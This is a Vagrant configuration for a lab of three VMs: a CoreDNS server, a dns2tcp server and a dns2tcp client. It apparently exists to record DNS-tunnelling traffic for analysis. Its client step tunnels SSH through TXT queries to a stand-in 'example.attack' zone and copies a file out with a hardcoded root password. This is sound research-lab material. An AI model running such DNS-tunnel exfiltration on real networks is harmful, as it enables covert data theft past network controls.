# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|



config.vm.define "coredns" do |coredns|

    # Set the box-type and version (default is latest)
    coredns.vm.box = "ubuntu/focal64"
    coredns.vm.box_version = ">= 0"
    
    # Set the hostname
    coredns.vm.hostname = "coredns"

    # Setup networking
    coredns.vm.network "private_network", ip: "192.168.0.10", virtualbox__intnet: "intnet"
    

    # Provision VM
    coredns.vm.provision "ansible_local" do |a|
        a.install = true,
        a.install_mode = "default",
        a.playbook = 'coredns_playbook',
        a.become_user = "root",
        a.become = true
    end
    
    coredns.vm.provision "ansible_local" do |a|
        a.install = true,
        a.install_mode = "default",
        a.playbook = "filebeat_playbook_coredns",
        a.become_user = "root",
        a.become = true
    end
    # Runtime triggers
    coredns.trigger.after [:up, :reload] do |trigger|
        trigger.info = "Begin TCPDUMP capture."
        trigger.run_remote = { inline: 'rm -f nohup.out; nohup tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53 & sleep 1; echo $! > /var/run/tcpdump.pid', privileged: true }
    end
    coredns.trigger.after [:up, :reload] do |trigger|
        trigger.info = "Executing 'run'-section of the scenario component."
        trigger.run_remote = { inline: 'sudo systemctl stop systemd-resolved; sudo /opt/coredns/coredns -conf /opt/coredns/Corefile > /tmp/coredns.log 2>&1 & sleep 1;', privileged: true }
    end

    # Data collection
    
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Stopping TCPDUMP"
        trigger.run_remote = { inline: 'if [ -f /var/run/tcpdump.pid ]; then kill $(cat /var/run/tcpdump.pid); rm -f /var/run/tcpdump.pid; fi', privileged: true }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Changing permissions on the remote artifact: /tmp/coredns.log"
        trigger.run_remote = { inline: 'chmod o+r /tmp/coredns.log', privileged: true }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Grabbing artifact from Guest machine: /tmp/coredns.log"
        trigger.run = { inline: 'vagrant scp coredns:/tmp/coredns.log coredns/' }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Removing artifact from Guest machine: /tmp/coredns.log"
        trigger.run_remote = { inline: 'rm -rf /tmp/coredns.log', privileged: true }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Changing permissions on the remote artifact: /tmp/filebeat.json*"
        trigger.run_remote = { inline: 'chmod o+r /tmp/filebeat.json*', privileged: true }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Grabbing artifact from Guest machine: /tmp/filebeat.json*"
        trigger.run = { inline: 'vagrant scp coredns:/tmp/filebeat.json* coredns/' }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Removing artifact from Guest machine: /tmp/filebeat.json*"
        trigger.run_remote = { inline: 'rm -rf /tmp/filebeat.json*', privileged: true }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Changing permissions on the remote artifact: /tmp/dns.pcap"
        trigger.run_remote = { inline: 'chmod o+r /tmp/dns.pcap', privileged: true }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Grabbing artifact from Guest machine: /tmp/dns.pcap"
        trigger.run = { inline: 'vagrant scp coredns:/tmp/dns.pcap coredns/' }
    end
    coredns.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Removing artifact from Guest machine: /tmp/dns.pcap"
        trigger.run_remote = { inline: 'rm -rf /tmp/dns.pcap', privileged: true }
    end
    end
config.vm.define "dns2tcpserver" do |dns2tcpserver|

    # Set the box-type and version (default is latest)
    dns2tcpserver.vm.box = "ubuntu/focal64"
    dns2tcpserver.vm.box_version = ">= 0"
    
    # Set the hostname
    dns2tcpserver.vm.hostname = "dns2tcpserver"

    # Setup networking
    dns2tcpserver.vm.network "private_network", ip: "192.168.0.20", virtualbox__intnet: "intnet"
    

    # Provision VM
    dns2tcpserver.vm.provision "ansible_local" do |a|
        a.install = true,
        a.install_mode = "default",
        a.playbook = 'dns2tcp_server_setup',
        a.become_user = "root",
        a.become = true
    end
    
    # Runtime triggers
    dns2tcpserver.trigger.after [:up, :reload] do |trigger|
        trigger.info = "Executing 'run'-section of the scenario component."
        trigger.run_remote = { inline: 'nohup asciinema rec /tmp/dns2tcp_server_TXT.cast -c \'set -x; dns2tcpd -d 1 -f /opt/dns2tcpdrc & sleep 1\'', privileged: true }
    end

    # Data collection
    dns2tcpserver.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Changing permissions on the remote artifact: /tmp/*.cast"
        trigger.run_remote = { inline: 'chmod o+r /tmp/*.cast', privileged: true }
    end
    dns2tcpserver.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Grabbing artifact from Guest machine: /tmp/*.cast"
        trigger.run = { inline: 'vagrant scp dns2tcpserver:/tmp/*.cast dns2tcpserver/' }
    end
    dns2tcpserver.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Removing artifact from Guest machine: /tmp/*.cast"
        trigger.run_remote = { inline: 'rm -rf /tmp/*.cast', privileged: true }
    end
    end
config.vm.define "dns2tcpclient" do |dns2tcpclient|

    # Set the box-type and version (default is latest)
    dns2tcpclient.vm.box = "ubuntu/focal64"
    dns2tcpclient.vm.box_version = ">= 0"
    
    # Set the hostname
    dns2tcpclient.vm.hostname = "dns2tcpclient"

    # Setup networking
    dns2tcpclient.vm.network "private_network", ip: "192.168.0.30", virtualbox__intnet: "intnet"
    

    # Provision VM
     dns2tcpclient.vm.provision "shell", inline: 'sudo apt-get install -y dns2tcp sshpass asciinema;', privileged: true
    
    # Runtime triggers
    dns2tcpclient.trigger.after [:up, :reload] do |trigger|
        trigger.info = "Executing 'run'-section of the scenario component."
        trigger.run_remote = { inline: 'asciinema rec /tmp/dns2tcp_client_TXT_noncompressed_0xDEADBEEF.cast -c \'set -x; dns2tcpc -z example.attack -k 0xDEADBEEF 192.168.0.10 -r ssh -l 12345  -T TXT & sleep 1; rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 12345" 127.0.0.1:/root/test-file /tmp/\'', privileged: true }
    end

    # Data collection
    dns2tcpclient.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Changing permissions on the remote artifact: /tmp/*.cast"
        trigger.run_remote = { inline: 'chmod o+r /tmp/*.cast', privileged: true }
    end
    dns2tcpclient.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Grabbing artifact from Guest machine: /tmp/*.cast"
        trigger.run = { inline: 'vagrant scp dns2tcpclient:/tmp/*.cast dns2tcpclient/' }
    end
    dns2tcpclient.trigger.before [:destroy, :halt, :reload] do |trigger|
        trigger.info = "Removing artifact from Guest machine: /tmp/*.cast"
        trigger.run_remote = { inline: 'rm -rf /tmp/*.cast', privileged: true }
    end
    end
end
